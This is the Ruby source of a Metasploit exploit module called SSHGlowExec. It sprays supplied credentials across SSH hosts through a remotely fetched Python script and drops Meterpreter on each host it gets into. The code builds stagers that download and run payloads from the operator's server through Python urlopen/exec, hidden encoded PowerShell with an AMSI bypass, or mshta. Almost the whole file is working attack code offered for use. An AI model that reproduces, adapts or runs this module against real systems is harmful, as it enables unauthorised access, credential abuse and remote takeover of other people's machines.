
require "msf/core"


class MetasploitModule < Msf::Exploit::Remote

    include Msf::Exploit::Powershell
    include Msf::Exploit::Remote::HttpServer

    Rank = NormalRanking

    def initialize(info = {})
        super(update_info(info,
            'Name'  =>  'SSHGlowExec',
            'Description'   =>  %q{
                This module will find our access in network and drop meterpreter on.
            },
            'Author'    =>  ["Abdallah Mohamed Elsharif"],
            'License'   =>  MSF_LICENSE,
            'Platform'         => %w[python win],
            'Targets'   =>  
            [
                [
                    'Python',
                    {
                      'Arch'     => ARCH_PYTHON,
                      'Platform' => 'python'
                    }
                  ],
                [
                    'PSH', 
                    {
                      'Arch' => [ARCH_X86, ARCH_X64],
                      'Platform' => 'win'
                    }
                  ],
                [ 
                    'HTA Powershell x86', 
                    { 
                        'Arch' => ARCH_X86,
                        'Platform' => 'win'
                    } 
                  ],
                [ 
                    'HTA Powershell x64', 
                    { 
                        'Arch' => ARCH_X64,
                        'Platform' => 'win'
                    } 
                  ]        
            ],
            'Version'   =>  '1.0'
        ))

        register_options([
            OptString.new('RHOST',[true,"Specific target host or file"]),
            OptString.new('Creds',[true,'File or user1:pass1,user2:pass2 or single']),
            OptInt.new('DELAY', [true, "Delay interval in seconds", 5])
        ],self.class)

        register_advanced_options(
            [
                OptBool.new('noDuplicate', [ true, 'Don\'t Duplicate execution using multiple users', true ]),
                OptBool.new('PSH-AmsiBypass', [ true, 'PSH - Request AMSI/SBL bypass before the stager', true ]),
                OptString.new('PSH-AmsiBypassURI', [ false, 'PSH - The URL to use for the AMSI/SBL bypass (Will be random if left blank)', '' ]),
                OptString.new('Py-StagerURI', [ false, 'Py - The URL to use for the first stage (Will be random if left blank)', '' ]),
                OptString.new('PSH-StagerURI', [ false, 'PSH - The URL to use for the first stage (Will be random if left blank)', '' ]),
                OptString.new('HTA-StagerURI', [ false, 'HTA - The URL to use for the first stage (Will be random if left blank)', '' ]),
                OptBool.new('PSH-EncodedCommand', [ true, 'PSH - Use -EncodedCommand for launcher', true ]),
                OptBool.new('Py-EncodedCommand', [ true, 'Python - Use base64 lib for launcher', true ]),
                OptBool.new('PSH-ForceTLS12', [ true, 'PSH - Force use of TLS v1.2', true ]),
                OptBool.new('PSH-Proxy', [ true, 'PSH - Use the system proxy', true ]),
            ]
          )

    end

    def on_request_uri(cli, request)

        if request.raw_uri.to_s.ends_with?(get_uri_for("Py-StagerURI"))
            data = gen_py_stager(get_uri)
            send_response(cli, data, 'Content-Type' => 'text/plain')
            return
        end

        if request.raw_uri.to_s.ends_with?(get_uri_for("PSH-StagerURI"))
            uri = get_uri
            if datastore['PSH-AmsiBypass']
                amsi_bypass_uri = uri + get_uri_for("PSH-AmsiBypassURI")
                data = gen_psh_stager([amsi_bypass_uri,uri])
            else
                data = gen_psh_stager(uri)
            end

            send_response(cli, data, 'Content-Type' => 'text/plain')
            return
        end

        if request.raw_uri.to_s.ends_with?(get_uri_for("HTA-StagerURI"))
            data = gen_hta_stager(get_uri)
            send_response(cli, data, 'Content-Type' => 'text/plain')
            return
        end

        if request.raw_uri.to_s.ends_with?(get_uri_for("PSH-AmsiBypassURI"))
            data = bypass_powershell_protections
            send_response(cli, data, 'Content-Type' => 'text/plain')
            return
        end
    
        case target.name
        when 'PSH'
            data = cmd_psh_payload(
                payload.encoded,
                payload_instance.arch.first
            )
        when 'Python'
            data = payload.encoded.to_s 
        else
            p = regenerate_payload(cli)
            data = Msf::Util::EXE.to_executable_fmt(
                framework,
                target.arch,
                target.platform,
                p.encoded,
                'hta-psh',
                { :arch => target.arch, :platform => target.platform }
            )

            send_response(cli, data, 'Content-Type' => 'application/hta')
            return
        end
        
        send_response(cli, data, 'Content-Type' => 'application/octet-stream')
    end

    def gen_psh_stager(url)
        ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl
        force_tls12 = Rex::Powershell::PshMethods.force_tls12 if datastore['PSH-ForceTLS12']
    
        download_string = datastore['PSH-Proxy'] ? Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url) : Rex::Powershell::PshMethods.download_and_exec_string(url)
        download_and_run = "#{force_tls12}#{ignore_cert}#{download_string}"
    
        # Generate main PowerShell command
        if datastore['PSH-EncodedCommand']
            download_and_run = encode_script(download_and_run)
            return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', encodedcommand: download_and_run)
        end
    
        return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)
    end

    def py_stager_code(url)
        return "from urllib.request import urlopen;exec(urlopen(\\\"#{url}\\\").read().decode(\\\"utf-8\\\"))"
    end

    def gen_py_stager(url)
        code = py_stager_code(url)
        py_launcher = 'nohup python3 -c "'

        if datastore['Py-EncodedCommand']
            py_launcher += "import base64; exec(base64.standard_b64decode("
            until !code.include?('\"') do code['\"'] = '"' end 
            b64 = Rex::Text.encode_base64(code)
            py_launcher += '\"' + b64 + '\").decode(\"utf-8\"))'
        else
            py_launcher += code 
        end

        py_launcher += '" </dev/null >/dev/null 2>&1 & '

        return py_launcher
    end

    def gen_hta_stager(url)
        return "mshta.exe #{url}"
    end

    def get_uri_for(option)
        # if uri in that option is empty will store random uri
        datastore[option] = random_uri if datastore[option].empty?
        return datastore[option]
    end

    def handle_file_args(file)
        # convert file content to SSHGlow format 
        args = ''
        lines = IO.readlines(file)
        counter = 1
        lines.each do |c|
            args += c.strip()
            args += ',' if lines.length != counter
            counter += 1
        end

        return args
    end
    
    def runSSHGlowExec(hosts,creds,delay,noDuplicate,stager)
        # python3 path
        py_path = IO.popen("which python3").read.strip

        # check if python3 already installed
        if py_path.empty? then
            return print_error("Python3 not installed please install it to use the module")
            
        else
            print_status("Try to load SSHGlow and perform scanning on targets\n")
            py_space = ' ' * 4
            py_code = "'import urllib; import sys; from urllib.request import urlopen\n"
            py_code += "try:\n#{py_space}exec(urlopen(\"https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py\").read().decode(\"utf-8\"))\n"
            py_code += "#{py_space}run(\"#{hosts}\",\"#{creds}\",delay=#{delay},no_duplicate=#{noDuplicate},cmd=#{stager})\n"
            py_code += "except KeyboardInterrupt:\n"
            py_code += "#{py_space}sys.exit(1)\n"
            py_code += "except urllib.error.URLError:\n"
            py_code += "#{py_space}print(\"\033[0;31m[!]\033[0;37m We need internet access to load SSHGlow\")'"
            
            puts(IO.popen("#{py_path} -c #{py_code}").read() + "\n")
            print_status("SSHGlow Finished !!")
        end
    end

    def primer()
        hosts = datastore['RHOST']
        creds = datastore['Creds']
        delay = datastore['Delay'].to_s
        noDuplicate = datastore['noDuplicate'] ? 'True' : 'False'

        # if targets in file
        hosts = handle_file_args(hosts) if File.file?(hosts)

        # if creds in file
        creds = handle_file_args(creds) if File.file?(creds) 

        uri = get_uri

        case target.name
            when "Python"
                url = uri + get_uri_for("Py-StagerURI")
            when "PSH"
                url = uri + get_uri_for("PSH-StagerURI")
            else
                url = uri + get_uri_for("HTA-StagerURI")
        end

        stager = "urlopen(\"#{url}\").read().decode(\"utf-8\")"

        runSSHGlowExec(hosts,creds,delay,noDuplicate,stager)
    end
end